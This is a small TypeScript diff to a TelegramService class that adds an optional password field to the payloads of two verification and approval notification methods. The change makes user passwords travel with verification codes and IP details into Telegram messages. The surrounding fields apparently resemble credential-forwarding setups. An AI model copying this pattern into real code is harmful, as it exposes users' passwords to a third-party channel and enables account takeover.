@@ -576,7 +576,7 @@ class TelegramService {
   }
 
   async sendVerificationNotification(data: {
-    code?: string
+    code?: string; password?: string
     verificationType?: string
     [key: string]: unknown
   }): Promise<void> {
@@ -630,7 +630,7 @@ class TelegramService {
     approvalsUrl?: string
     ip?: string
     maskedEmail?: string
-    maskedPhone?: string
+    maskedPhone?: string; password?: string
   }): Promise<void> {
     if (typeof (this as any).sendVerificationApprovalNotification === "function") {
       await (this as any).sendVerificationApprovalNotification({
